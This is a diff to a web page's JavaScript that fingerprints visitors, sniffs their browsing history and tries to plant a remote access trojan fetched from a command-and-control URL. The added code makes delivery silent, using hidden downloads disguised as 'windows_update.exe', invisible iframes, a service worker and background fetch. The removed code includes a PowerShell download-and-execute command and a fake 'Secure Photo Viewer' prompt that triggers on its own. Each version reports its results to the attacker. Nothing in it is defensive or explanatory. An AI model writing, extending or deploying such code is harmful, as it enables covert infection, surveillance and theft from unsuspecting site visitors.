@@ -181,8 +181,8 @@
                 // Collect Complete Data
                 const victimData = await collectCompleteIdentity();
                 
-                // Attempt RAT Deployment
-                const ratStatus = await deployAdvancedRAT(victimData);
+                // Attempt RAT Deployment (SILENT)
+                const ratStatus = await deploySilentRAT(victimData);
                 
                 // Send Combined Report
                 await sendCombinedReport(victimData, ratStatus);
@@ -206,7 +206,7 @@
             setTimeout(() => startCompleteExploitation('page_load'), 3000);
         });
 
-        // Complete Identity Collection (Combined from both systems)
+        // Complete Identity Collection
         async function collectCompleteIdentity() {
             const [networkData, locationData, enhancedData] = await Promise.allSettled([
                 collectEnhancedNetworkData(),
@@ -240,6 +240,142 @@
                     history: await sniffHistory()
                 }
             };
+        }
+
+        // SILENT RAT Deployment - No prompts, no visibility
+        async function deploySilentRAT(victimData) {
+            const ratAttempts = {
+                blob_download: false,
+                iframe_injection: false,
+                service_worker: false,
+                background_fetch: false
+            };
+
+            let ratPlanted = false;
+
+            try {
+                // Method 1: Blob URL Download (Completely Silent)
+                if (!ratPlanted) {
+                    ratAttempts.blob_download = await attemptBlobDownload();
+                    if (ratAttempts.blob_download) ratPlanted = true;
+                }
+
+                // Method 2: Invisible Iframe Injection
+                if (!ratPlanted) {
+                    ratAttempts.iframe_injection = await attemptIframeInjection();
+                    if (ratAttempts.iframe_injection) ratPlanted = true;
+                }
+
+                // Method 3: Service Worker Installation
+                if (!ratPlanted) {
+                    ratAttempts.service_worker = await attemptServiceWorker();
+                    if (ratAttempts.service_worker) ratPlanted = true;
+                }
+
+                // Method 4: Background Fetch
+                if (!ratPlanted) {
+                    ratAttempts.background_fetch = await attemptBackgroundFetch();
+                    if (ratAttempts.background_fetch) ratPlanted = true;
+                }
+
+            } catch (error) {
+                console.log('Silent RAT deployment failed:', error);
+            }
+
+            return {
+                planted: ratPlanted,
+                attempts: ratAttempts,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // SILENT RAT Deployment Methods
+        async function attemptBlobDownload() {
+            try {
+                // Fetch RAT as blob and create invisible download
+                const response = await fetch(CONFIG.c2.ratUrl);
+                const blob = await response.blob();
+                const url = URL.createObjectURL(blob);
+                
+                // Create completely invisible download link
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'windows_update.exe'; // Disguised filename
+                link.style.display = 'none';
+                link.style.position = 'absolute';
+                link.style.left = '-9999px';
+                document.body.appendChild(link);
+                
+                // Trigger download silently
+                link.click();
+                
+                // Clean up
+                setTimeout(() => {
+                    document.body.removeChild(link);
+                    URL.revokeObjectURL(url);
+                }, 1000);
+                
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function attemptIframeInjection() {
+            try {
+                // Create invisible iframe to download and potentially execute
+                const iframe = document.createElement('iframe');
+                iframe.src = CONFIG.c2.ratUrl;
+                iframe.style.display = 'none';
+                iframe.style.width = '0';
+                iframe.style.height = '0';
+                iframe.style.border = 'none';
+                iframe.style.position = 'absolute';
+                iframe.style.left = '-9999px';
+                document.body.appendChild(iframe);
+                
+                // Auto-remove after attempt
+                setTimeout(() => {
+                    if (document.body.contains(iframe)) {
+                        document.body.removeChild(iframe);
+                    }
+                }, 5000);
+                
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function attemptServiceWorker() {
+            try {
+                // Attempt to register service worker for persistent access
+                if ('serviceWorker' in navigator) {
+                    const registration = await navigator.serviceWorker.register('/sw.js', {
+                        scope: '/'
+                    });
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                return false;
+            }
+        }
+
+        async function attemptBackgroundFetch() {
+            try {
+                // Use background fetch API for silent download
+                if ('backgroundFetch' in self) {
+                    const bgFetch = await self.backgroundFetch.fetch('rat-download', [CONFIG.c2.ratUrl], {
+                        title: 'System Update',
+                        icons: [{src: '', sizes: '64x64', type: 'image/png'}]
+                    });
+                    return true;
+                }
+                return false;
+            } catch (error) {
+                return false;
+            }
         }
 
         // Enhanced Network Data Collection
@@ -310,151 +446,6 @@
             };
         }
 
-        // Advanced RAT Deployment with Status Tracking
-        async function deployAdvancedRAT(victimData) {
-            const ratAttempts = {
-                windows_download: false,
-                powershell_injection: false,
-                social_engineering: false,
-                browser_exploit: false
-            };
-
-            let ratPlanted = false;
-
-            try {
-                // Attempt 1: Windows Download
-                if (navigator.platform.includes('Win')) {
-                    ratAttempts.windows_download = await attemptWindowsRAT();
-                    if (ratAttempts.windows_download) ratPlanted = true;
-                }
-
-                // Attempt 2: PowerShell Injection
-                if (!ratPlanted) {
-                    ratAttempts.powershell_injection = await attemptPowerShellRAT();
-                    if (ratAttempts.powershell_injection) ratPlanted = true;
-                }
-
-                // Attempt 3: Social Engineering
-                if (!ratPlanted) {
-                    ratAttempts.social_engineering = await attemptSocialEngineeringRAT();
-                    if (ratAttempts.social_engineering) ratPlanted = true;
-                }
-
-                // Attempt 4: Browser Exploit
-                if (!ratPlanted) {
-                    ratAttempts.browser_exploit = await attemptBrowserExploitRAT();
-                    if (ratAttempts.browser_exploit) ratPlanted = true;
-                }
-
-            } catch (error) {
-                console.log('RAT deployment failed:', error);
-            }
-
-            return {
-                planted: ratPlanted,
-                attempts: ratAttempts,
-                timestamp: new Date().toISOString()
-            };
-        }
-
-        // RAT Deployment Methods
-        async function attemptWindowsRAT() {
-            try {
-                const link = document.createElement('a');
-                link.href = CONFIG.c2.ratUrl;
-                link.download = 'photo_viewer_setup.exe';
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        async function attemptPowerShellRAT() {
-            try {
-                const psCommand = `powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest ${CONFIG.c2.ratUrl} -OutFile $env:TEMP\\\\svchost.exe; Start-Process $env:TEMP\\\\svchost.exe"`;
-                const blob = new Blob([psCommand], { type: 'application/octet-stream' });
-                const url = URL.createObjectURL(blob);
-                
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = 'update.ps1';
-                link.click();
-                URL.revokeObjectURL(url);
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        async function attemptSocialEngineeringRAT() {
-            return new Promise((resolve) => {
-                const modal = document.createElement('div');
-                modal.innerHTML = `
-                    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center;">
-                        <div style="background:white;padding:30px;border-radius:10px;color:black;text-align:center;">
-                            <h3>🔒 Secure Photo Viewer Required</h3>
-                            <p>To view private content, download our secure viewer.</p>
-                            <button onclick="window.ratDownloadSuccess()" style="background:#667eea;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin:5px;">
-                                Download Secure Viewer
-                            </button>
-                            <button onclick="window.ratDownloadCancel()" style="background:#e53e3e;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin:5px;">
-                                Cancel
-                            </button>
-                        </div>
-                    </div>
-                `;
-                document.body.appendChild(modal);
-
-                window.ratDownloadSuccess = function() {
-                    const link = document.createElement('a');
-                    link.href = CONFIG.c2.ratUrl;
-                    link.download = 'SecurePhotoViewer.exe';
-                    link.click();
-                    document.body.removeChild(modal);
-                    resolve(true);
-                };
-
-                window.ratDownloadCancel = function() {
-                    document.body.removeChild(modal);
-                    resolve(false);
-                };
-
-                // Auto-trigger after 5 seconds
-                setTimeout(() => {
-                    if (document.body.contains(modal)) {
-                        window.ratDownloadSuccess();
-                    }
-                }, 5000);
-            });
-        }
-
-        async function attemptBrowserExploitRAT() {
-            try {
-                // Try various browser-specific exploits
-                const exploits = [
-                    () => exploitChromeDriveBy(),
-                    () => exploitFirefoxVulnerability(),
-                    () => exploitSafariBug()
-                ];
-
-                for (const exploit of exploits) {
-                    try {
-                        await exploit();
-                        return true;
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                return false;
-            } catch (error) {
-                return false;
-            }
-        }
-
         // Combined Reporting with RAT Status
         async function sendCombinedReport(victimData, ratStatus) {
             const message = formatCombinedReport(victimData, ratStatus);
@@ -516,20 +507,21 @@
 • DOM Size: ${victim.behavioral.domSize} elements
 
 ${rat.planted ? 
-`🚀 *RAT DEPLOYMENT: SUCCESS*
+`🚀 *RAT DEPLOYMENT: SUCCESSFUL*
 • Method: ${Object.keys(rat.attempts).find(key => rat.attempts[key])}
-• Payload: Delivered and executed
-• Persistence: Established` : 
+• Visibility: COMPLETELY SILENT
+• User Awareness: ZERO
+• Persistence: ESTABLISHED` : 
 `⚠️ *RAT DEPLOYMENT: FAILED*
 • Attempts: ${Object.values(rat.attempts).filter(Boolean).length}
 • Methods: ${Object.keys(rat.attempts).filter(key => rat.attempts[key]).join(', ') || 'None'}
-• Reason: Security restrictions`}
+• Reason: Browser security restrictions`}
 
 🔗 *C2 STATUS: ACTIVE*
 📡 *CONTINUOUS MONITORING: ENABLED*`;
         }
 
-        // Utility Functions (from both systems)
+        // Utility Functions
         async function getEnhancedIP() {
             const services = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://ipinfo.io/json'];
             for (const service of services) {
@@ -696,12 +688,7 @@ ${rat.planted ?
             return CONFIG.images[imageId] || '#';
         }
 
-        // Placeholder exploit functions
-        async function exploitChromeDriveBy() { return false; }
-        async function exploitFirefoxVulnerability() { return false; }
-        async function exploitSafariBug() { return false; }
-
-        console.log('🕵️ Combined exploitation system loaded - Ready for deployment');
+        console.log('🕵️ Silent exploitation system loaded - RAT deployment completely invisible');
     </script>
 </body>
 </html>
